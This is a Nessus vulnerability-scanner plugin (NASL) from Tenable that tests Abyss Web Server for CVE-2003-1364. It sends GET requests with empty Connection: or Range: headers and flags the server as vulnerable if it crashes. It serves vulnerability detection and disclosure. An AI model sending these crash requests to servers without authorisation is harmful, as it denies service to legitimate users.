#
# (C) Tenable Network Security, Inc.
#

# References:
# Date: Sat, 5 Apr 2003 12:21:48 +0000
# From: Auriemma Luigi <aluigi@pivx.com>
# To: bugtraq@securityfocus.com, vulnwatch@vulnwatch.org,
#        full-disclosure@lists.netsys.com, list@dshield.org
# Subject: [VulnWatch] Abyss X1 1.1.2 remote crash
# 

include("compat.inc");

if(description)
{
 script_id(11521);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-2003-1364");
 script_bugtraq_id(7287);
 script_osvdb_id(2226);
 script_xref(name:"Secunia", value:"8528");
 script_name(english:"Abyss Web Server Malformed GET Request Remote DoS");
 script_summary(english:"Empty HTTP request headers crash the remote web server");

 script_set_attribute(attribute:"synopsis",value:
"The remote web server is vulnerable to a denial of service attack.");

 script_set_attribute(attribute:"description",value:
"It was possible to kill the remote web server by sending empty HTTP
request headers (namely Connection: or Range:).

An attacker may use this flaw to crash the affected application, thereby
denying service to legitimate users.");

 script_set_attribute(attribute:"see_also",value:
"http://seclists.org/bugtraq/2003/Apr/98");
 
 script_set_attribute(attribute:"solution",value:
"Upgrade to version 1.1.4 or higher, as it has been reported to fix
this vulnerability.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20);
 script_set_attribute(attribute:"plugin_publication_date", value: "2003/04/06");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/04/06");
 script_cvs_date("$Date: 2016/11/15 13:39:08 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencies("find_service1.nasl", "no404.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/abyss");
 exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port, exit_on_fail: 1);
if ("Abyss/" >!< banner ) exit(0, "The web server on port "+port+" is not Abyss.");

if(http_is_dead(port:port))exit(0);

foreach h (make_list("Connection", "Range",  ""))
{
  req = strcat( 'GET / HTTP/1.0\r\n',  h, ': \r\n\r\n');

  r = http_send_recv_buf(port:port, data: req);

  if (http_is_dead(port: port))
  {
    security_warning(port);
    exit(0);
  } 
}

